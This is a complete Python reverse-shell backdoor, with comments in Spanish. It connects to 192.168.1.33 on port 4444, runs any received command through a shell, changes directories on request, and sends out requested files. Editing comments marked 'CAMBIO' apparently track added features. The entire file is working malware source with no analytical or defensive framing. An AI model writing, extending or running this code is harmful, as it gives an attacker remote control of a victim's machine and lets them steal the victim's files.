#!/usr/bin/env python3
import socket, subprocess, sys, os

class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(b" \n [+]Conexion Exitosamente Establecida \n")
        self.current_dir = os.getcwd()
         

    def ejecutarComando(self, command):
        try:
            command_str = command.decode('utf-8', errors='ignore').strip()
            return subprocess.check_output(
                command_str, 
                shell=True, 
                stderr=subprocess.STDOUT,
                cwd=self.current_dir  # ← CAMBIO 1: AGREGAR ESTO
            )
        except Exception as e:
            return str(e).encode('utf-8')
    
    def cambiarDirectorio(self, path):
        try:
            os.chdir(path)
            self.current_dir = os.getcwd()
            return f"[+] Directorio cambiado a: {self.current_dir}".encode()
        except Exception as e:
            return f"[!] Error: {str(e)}".encode()
    
    # ← CAMBIO 2: NUEVA FUNCIÓN
    def downloadArchivo(self, path):
        try:
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    contenido = f.read()
                self.connection.send(b"[+] Archivo enviado\n")
                self.connection.send(contenido)
                return None
            else:
                return f"[!] Error: Archivo no existe: {path}".encode()
        except Exception as e:
            return f"[!] Error: {str(e)}".encode()

    def run(self):
        while True:
            command = self.connection.recv(1024000)
            command_str = command.decode('utf-8', errors='ignore').strip()
            
            if command_str == "salir":
                self.connection.close()
                exit()

            elif command_str.startswith("cd "):
                path = command_str[3:].strip()
                resultado = self.cambiarDirectorio(path)
                self.connection.send(resultado)
                continue
            
            # ← CAMBIO 3: NUEVO CHECK
            elif command_str.startswith("download "):
                path = command_str[9:].strip()
                resultado = self.downloadArchivo(path)
                if resultado:
                    self.connection.send(resultado)
                continue
            
            resultadosComando = self.ejecutarComando(command)
            self.connection.send(resultadosComando)

puerta = Backdoor("192.168.1.33", 4444)
puerta.run()